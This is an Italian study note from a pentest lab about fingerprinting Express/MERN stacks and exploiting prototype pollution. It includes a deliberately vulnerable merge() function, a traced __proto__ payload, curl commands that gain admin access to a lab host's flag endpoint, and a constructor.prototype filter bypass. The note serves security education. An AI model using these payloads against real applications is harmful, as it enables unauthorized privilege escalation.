---
title: "MERN Stack: Fingerprinting e Prototype Pollution"
date: 2026-09-09 12:00:00 +0100
categories: [PT1, Web Exploitation]
tags: [mern, express, nodejs, prototype-pollution, fingerprinting]
---

## Il quadro generale

Il fingerprinting dello stack non è un'abilità accessoria: è un **moltiplicatore diretto della velocità di sfruttamento**. Una volta noti stack e versione, si conosce già una superficie di attacco plausibile.

Il flusso di lavoro dei red teamer esperti segue tre fasi:

1. **Identificazione dello stack** tramite segnali nella risposta HTTP
2. **Ricerca di una vulnerabilità applicabile**
3. **Esecuzione della catena di exploit**

Questa nota copre le prime due fasi (fingerprinting) e un caso concreto di fase 3: la **prototype pollution** su un'app MERN.


## Lo stack MERN

**MERN** = MongoDB, Express.js, React, Node.js. È la scelta predefinita per aziende JavaScript-only che vogliono un unico linguaggio su tutto lo stack.

Deployment tipico su Ubuntu:

| Componente | Dettaglio |
|---|---|
| Node.js | da NodeSource PPA |
| Express | in ascolto su porta 3000 o 5000 |
| MongoDB | porta 27017 |
| Reverse proxy | Nginx, davanti a tutto in produzione |

> In produzione, Nginx fa da intermediario e la porta di Express non è raggiungibile dall'esterno. In ambienti **misconfigurati o strumenti interni**, il processo Express è spesso esposto direttamente — è il caso "facile" da fingerprintare.
{: .prompt-tip }



## Fingerprinting: segnali e affidabilità

```console
$ curl -I 10.113.162.136:3000/
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Set-Cookie: connect.sid=s%3A2PyC5xblQ3G0ERkE60uOUddRtPs2jacn...; Path=/; HttpOnly
```

| Segnale | Confidenza | Note |
|---|---|---|
| `X-Powered-By: Express` | Alta | Presente di default; assente se `app.disable('x-powered-by')`, Helmet, o reverse proxy che lo strippa |
| `Set-Cookie: connect.sid=...` | Alta (condizionata) | Da `express-session`; dipende da `saveUninitialized` (vedi sotto) |
| `Cannot GET /nonexistent` (testo semplice) | **Massima** | Comportamento di default del router Express, difficile da mascherare, distinto da Django/Apache/Next.js |

```console
$ curl http://10.113.162.136:3000/nonexistent
<!DOCTYPE html>
<html><head><title>Error</title></head>
<body><pre>Cannot GET /nonexistent</pre></body></html>
```

> Nessun singolo segnale è definitivo da solo — assenza ≠ esclusione. Si combinano più segnali per aumentare la confidenza. Il test sull'unhandled route è l'unico che funziona indipendentemente da qualsiasi stato (autenticazione, configurazione del cookie, ecc.), quindi è il più affidabile in fase di recon iniziale.
{: .prompt-warning }

### `app.disable('x-powered-by')` — dove si chiama

Riga di codice nell'inizializzazione dell'app, eseguita una sola volta all'avvio:

```js
const express = require('express');
const app = express();

app.disable('x-powered-by');   // spegne l'header X-Powered-By

app.listen(3000);
```

### Helmet

Middleware npm (`npm install helmet`) che raggruppa un insieme di header di sicurezza HTTP in una riga:

```js
const helmet = require('helmet');
app.use(helmet());
```

Rimuove `X-Powered-By` di default e imposta anche `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, ecc. Vedere altri header tipici di Helmet durante il recon è un segnale indiretto di hardening applicativo.

### `connect.sid`: perché si chiama così e cosa contiene

Il nome deriva da **Connect**, il framework middleware su cui Express fu originariamente costruito prima di Express 4. È hardcoded come default in `express-session` (configurabile con l'opzione `name`). `sid` = *session ID*.

Comportamento condizionato dall'opzione `saveUninitialized`:

| Setting | Comportamento |
|---|---|
| `saveUninitialized: true` (default storico) | Cookie presente su qualsiasi richiesta, anche non autenticata |
| `saveUninitialized: false` (raccomandato per login) | Cookie presente solo dopo che la sessione viene effettivamente scritta |

> Non è legato specificamente al "login" in senso stretto, ma a **qualunque scrittura in `req.session`** — può essere causata anche da CSRF token, flash message, contatori, ecc. Nella fase di recon iniziale black-box tipicamente non abbiamo credenziali valide, quindi non possiamo contare su questo segnale finché non inneschiamo una scrittura in sessione.
{: .prompt-warning }

**Anatomia del valore del cookie:**

```
s%3A2PyC5xblQ3G0ERkE60uOUddRtPs2jacn.0gAB6ByfrNg3b48tDXARTEBQG0pLlKkBofAsa69W%2FY0
```

Decodificato (`%3A` = `:`, `%2F` = `/`):

```
s:2PyC5xblQ3G0ERkE60uOUddRtPs2jacn.0gAB6ByfrNg3b48tDXARTEBQG0pLlKkBofAsa69W/Y0
```

| Parte | Valore | Significato |
|---|---|---|
| Prefisso | `s:` | il valore è firmato (signed) |
| Session ID | `2PyC5xblQ3G0ERkE60uOUddRtPs2jacn` | identificatore usato per lookup nello store |
| Firma | `0gAB6ByfrNg3b48tDXARTEBQG0pLlKkBofAsa69W/Y0` | HMAC su session ID + `secret` del server |

Il session ID **non è criptato**, solo firmato — chiunque lo può leggere. Modificarlo senza conoscere il `secret` rompe la firma e il cookie viene scartato: per questo gli attacchi mirano a **rubare** un cookie valido (XSS, sniffing, session fixation) piuttosto che modificarne uno a mano.

## Validazione vs sanitizzazione

| Concetto | Cosa controlla | Esempio |
|---|---|---|
| **Validazione** | La *forma* del dato è quella attesa? | Whitelist di chiavi accettate (`name`, `email`) |
| **Sanitizzazione** | Il dato contiene contenuto pericoloso da neutralizzare? | Rimuovere/escapare `__proto__`, `constructor`, `prototype` prima del merge |

> Per la prototype pollution la difesa più efficace è la **validazione** (whitelist), perché elimina il problema a monte. Una blocklist di sanitizzazione è per definizione incompleta — è esattamente il motivo per cui esiste il bypass `constructor.prototype` (vedi sotto).
{: .prompt-tip }

## Prototype pollution: il concetto da zero

### Cos'è un prototype

Ogni oggetto JavaScript ha un link interno a un altro oggetto, il suo **prototype**. Accedendo a `obj.x`:

1. il motore cerca una proprietà **propria** (*own property*) `x` su `obj`
2. se non la trova, sale al prototype di `obj` e ripete la ricerca
3. continua a risalire finché non trova `x`, oppure arriva a `Object.prototype` (la cui prototype è `null` — fine catena)

```js
let mario = {};
mario.eta;   // undefined — nessuna own property, risale fino a Object.prototype, non trovata

Object.prototype.eta = 99;

mario.eta;   // 99 — non è una own property di mario, ma la trova risalendo la catena

let luigi = {};
luigi.eta;   // 99 — anche lui! Object.prototype è condiviso da OGNI oggetto plain
```

`Object.prototype` è come un "archivio condiviso" da cui ogni oggetto "semplice" (`{}`) del processo eredita come fallback. Scrivere lì una proprietà la rende visibile — via risoluzione della catena — su ogni oggetto senza una propria proprietà con lo stesso nome, in **tutto** il processo Node, per tutta la sua vita (finché non viene riavviato).

### Cos'è la prototype pollution

È lo stesso meccanismo, ma innescato **per errore, da un attaccante, tramite input esterno** (es. JSON in una richiesta HTTP) invece che scritto volontariamente dallo sviluppatore. Se una funzione scrive dati esterni dentro un oggetto senza controllare i nomi delle chiavi, un attaccante può scrivere direttamente su `Object.prototype` invece che su una proprietà normale.

### La chiave speciale `__proto__`

`__proto__` non è una proprietà dati qualunque: è una **proprietà accessor** (getter/setter) ereditata da `Object.prototype`. Acceduta su un oggetto plain, il getter restituisce il vero prototype interno dell'oggetto — cioè `Object.prototype` stesso:

```js
mario.__proto__.eta = 50;
// mario.__proto__  → LETTURA, restituisce l'oggetto Object.prototype
// .eta = 50         → SCRITTURA, su quell'oggetto
// equivalente a: Object.prototype.eta = 50
```

> `JSON.parse('{"__proto__": {...}}')` **non** attiva questo accessor — crea una own property dati letteralmente chiamata `"__proto__"`, tramite un meccanismo interno diverso. Il pericolo è nel codice *successivo* che itera le chiavi con `for...in` e fa `target[key]` con bracket notation su un oggetto normale: lì scatta l'accessor ereditato.
{: .prompt-info }

## Il caso MERN: la merge() vulnerabile

Il codice del lab:

```js
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

Chiamata dall'endpoint:

```js
app.post('/api/user/update', (req, res) => {
  merge(req.session.currentUser, req.body);   // target = currentUser, source = il JSON inviato
  res.json({ status: 'updated' });
});
```

**Ruolo dei parametri:**
- `source` = i dati in arrivo (il JSON mandato dal client)
- `target` = l'oggetto esistente su cui i dati vengono scritti — un "puntatore mobile" che a ogni livello di ricorsione si sposta un passo più a fondo dentro l'oggetto

Con un payload legittimo `{"name": "Alice"}` la funzione scrive `target.name = "Alice"` — comportamento atteso.

### Trace passo-passo del payload malevolo

Payload: `{"__proto__": {"isAdmin": true}}`

**Chiamata 1** — `target` = oggetto utente, `source` = `{"__proto__": {isAdmin: true}}`
- `for key in source` enumera `"__proto__"` come chiave normale (frutto del `JSON.parse`)
- `source["__proto__"]` → `{isAdmin: true}`, è un oggetto → ramo ricorsivo
- `target["__proto__"]` → qui scatta il getter ereditato → restituisce `Object.prototype` (truthy) → **non** viene sovrascritto con `{}`
- ricorsione: `merge(Object.prototype, {isAdmin: true})` — il nuovo `target` è ora `Object.prototype` stesso

**Chiamata 2** — `target` = `Object.prototype`, `source` = `{isAdmin: true}`
- `key = "isAdmin"`, ramo else
- `target["isAdmin"] = source["isAdmin"]` → cioè **`Object.prototype.isAdmin = true`**

> Il codice vulnerabile non controlla mai se il prossimo `target` sia un oggetto "innocuo" creato per l'occasione o un oggetto condiviso e pericoloso come `Object.prototype`. Tratta `__proto__` come una chiave qualunque, lasciando che `target` "scivoli" dentro l'archivio condiviso globale.
{: .prompt-danger }

Da questo momento **ogni** oggetto plain nel processo — inclusa `req.session.currentUser || {}` letta dall'endpoint admin, un oggetto senza own property `isAdmin` — risolve `.isAdmin` a `true` via prototype chain. Non è scoped a una request o a un utente: è globale e persistente finché il server non viene riavviato.

### Sfruttamento

Endpoint coinvolti:

| Endpoint | Metodo | Scopo |
|---|---|---|
| `/api/user/update` | POST | Accetta JSON e lo fonde nell'oggetto utente di sessione |
| `/api/admin/flag` | GET | Restituisce una flag se l'utente ha `isAdmin` |

```js
app.get('/api/admin/flag', (req, res) => {
  const currentUser = req.session.currentUser || {};
  if (currentUser.isAdmin) {               // risolve true via prototype chain
    res.json({ flag: '[REDACTED]' });
  } else {
    res.status(403).json({ error: 'Not authorized' });
  }
});
```

**Step 1 — verifica del gate (baseline):**

```console
$ curl -c cookies.txt http://10.113.162.136:3000/
$ curl -b cookies.txt http://10.113.162.136:3000/api/admin/flag
{"error":"Not authorized"}
```

**Step 2 — payload di prototype pollution:**

```console
$ curl -b cookies.txt -X POST http://10.113.162.136:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
{"status":"updated"}
```

**Step 3 — richiesta della flag:**

```console
$ curl -b cookies.txt http://10.113.162.136:3000/api/admin/flag
{"flag":"[REDACTED]"}
```

Il tuo utente non è mai stato reso admin direttamente: hai avvelenato l'archivio condiviso da cui ogni utente, incluso il tuo, eredita di default.

### Bypass: `constructor.prototype`

Se un filtro blocca la stringa letterale `__proto__`, esiste una via alternativa verso lo stesso oggetto. Per un oggetto plain, `obj.constructor` è la funzione `Object` (ereditata), e `Object.prototype` è la property `prototype` di quella funzione:

```json
{"constructor": {"prototype": {"isAdmin": true}}}
```

Passato nella stessa `merge()`, arriva a `Object.prototype` con due hop invece di uno, aggirando una blocklist che filtra solo `__proto__` letterale — `constructor` e `prototype` sono nomi di chiave del tutto legittimi in altri contesti, quindi difficili da bloccare senza rompere funzionalità legittime.
